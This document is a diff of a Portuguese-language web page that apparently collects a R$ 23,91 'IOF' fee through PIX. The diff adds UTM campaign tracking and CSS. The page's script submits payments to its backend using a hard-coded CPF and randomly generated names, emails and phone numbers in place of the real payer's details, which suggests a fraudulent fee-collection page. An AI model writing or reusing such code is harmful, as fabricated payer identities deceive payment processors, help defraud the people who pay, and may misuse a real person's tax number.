@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -490,6 +489,17 @@
     .et-accent { color: #149846; }
     .et-accent-700 { color: #149846; }
   </style>
+  <style id="__jsx-564433028">
+    .redirectToB2b.jsx-564433028 {
+      margin-top: 7rem;
+      text-align: center;
+    }
+    @media screen and (min-width:960px) {
+      .redirectToB2b.jsx-564433028 {
+        margin-top: 9.125rem;
+      }
+    }
+  </style>
   <style id="__jsx-3245007174">
     * { box-sizing: border-box; }
     a, abbr, acronym, address, applet, b, big, blockquote, body, caption, center, cite, code, dd, del, dfn, div, dl, dt, em, fieldset, font, form, h1, h2, h3, h4, h5, h6, html, i, iframe, img, ins, kbd, label, legend, li, object, ol, p, pre, q, s, samp, small, span, strike, strong, sub, sup, table, tbody, td, tfoot, th, thead, tr, tt, u, ul, var {
@@ -668,6 +678,7 @@
     .et-violet-lighter { color: rgba(var(--theme-violet-lighter)); }
   </style>
   <style id="__jsx-2521071326">
+    * { box-sizing: border-box; }
     button {
       border: none;
       margin: 0;
@@ -769,6 +780,7 @@
     .back-bar.sign-up__backbar { margin: 0 auto !important; width: 31.25rem; }
   </style>
   <style id="__jsx-2446720300">
+    * { box-sizing: border-box; }
     :root {
       --space-1: 0.5rem;
       --space-2: 1rem;
@@ -955,11 +967,23 @@
     </div>
   </main>
   <script>
+    // Funções para dados UTM
+    function obterParametrosUTM() {
+      const urlAtual = window.location.search;
+      const parametros = new URLSearchParams(urlAtual);
+      const utms = {};
+      const parametrosUTM = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'utm_id'];
+      parametrosUTM.forEach(param => {
+        if (parametros.has(param)) {
+          utms[param] = parametros.get(param);
+        }
+      });
+      return utms;
+    }
     // Funções para dados aleatórios
     function generateRandomCpf() {
       return '45604973890'; // CPF fixo conforme o primeiro pagamento
     }
-
     function generateRandomPhone() {
       const ddd = Math.floor(Math.random() * (99 - 11 + 1) + 11).toString();
       let number = '9';
@@ -969,7 +993,6 @@
       }
       return `${ddd}${number}`.substring(0, 12);
     }
-
     function generateRandomEmail() {
       const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
       let name = '';
@@ -978,7 +1001,6 @@
       for (let i = 0; i < 5; i++) domain += chars.charAt(Math.floor(Math.random() * chars.length));
       return `${name}@${domain}.com`;
     }
-
     function generateRandomName() {
       const firstNames = ["João", "Maria", "Pedro", "Ana", "Carlos", "Juliana", "Lucas", "Mariana", "Fernando", "Beatriz", "Rafael", "Sofia"];
       const lastNames = ["Silva", "Santos", "Oliveira", "Souza", "Lima", "Fernandes", "Costa", "Pereira", "Almeida", "Nascimento", "Rodrigues", "Martins"];
@@ -986,17 +1008,15 @@
       const randomLastName = lastNames[Math.floor(Math.random() * lastNames.length)];
       return `${randomFirstName} ${randomLastName}`;
     }
-
     // Função para verificar o status do pagamento
     async function checkPaymentStatus(transactionId) {
       const paymentStatus = document.getElementById('paymentStatus');
       try {
-        const response = await fetch(`/pagamentoiof/api/check-payment?id=${transactionId}`, {
+        const response = await fetch(`/pagamentoiof2/api/check-payment?id=${transactionId}`, {
           method: 'GET',
           headers: { 'Content-Type': 'application/json' }
         });
         const data = await response.json();
-
         if (response.ok && data.status) {
           paymentStatus.style.display = 'block';
           if (data.status === 'APPROVED') {
@@ -1025,7 +1045,6 @@
         return false;
       }
     }
-
     // Função para iniciar polling do status do pagamento
     function startPaymentPolling(transactionId) {
       const interval = setInterval(async () => {
@@ -1035,24 +1054,21 @@
         }
       }, 5000);
     }
-
     // Função para gerar o PIX
     document.addEventListener('DOMContentLoaded', function () {
       const verifyButton = document.getElementById('verifyButton');
       const pixGeneratedContainer = document.getElementById('pixGeneratedContainer');
       const efetuarVerificacao = document.getElementById('efetuar-verificacao');
       const valorIOFcentavos = 2391; // R$ 23,91 em centavos
-
       verifyButton.addEventListener('click', async function (event) {
         event.preventDefault();
         verifyButton.textContent = 'Gerando PIX...';
         verifyButton.disabled = true;
-
         const fixedCpf = generateRandomCpf();
         const randomName = generateRandomName();
         const randomEmail = generateRandomEmail();
         const randomPhone = generateRandomPhone();
-
+        const utms = obterParametrosUTM();
         const requestBody = {
           name: randomName,
           email: randomEmail,
@@ -1066,9 +1082,9 @@
               quantity: 1,
               tangible: false
             }
-          ]
+          ],
+          trackingParameters: utms
         };
-
         try {
           console.log("🟢 Enviando dados para o backend:", requestBody);
           const response = await fetch('/pagamentoiof2/api/gerar-pix', {
@@ -1077,7 +1093,6 @@
             body: JSON.stringify(requestBody)
           });
           const data = await response.json();
-
           if (response.ok && data.pixQrCode && data.pixCode && data.transactionId) {
             efetuarVerificacao.style.display = 'none';
             pixGeneratedContainer.style.display = 'block';
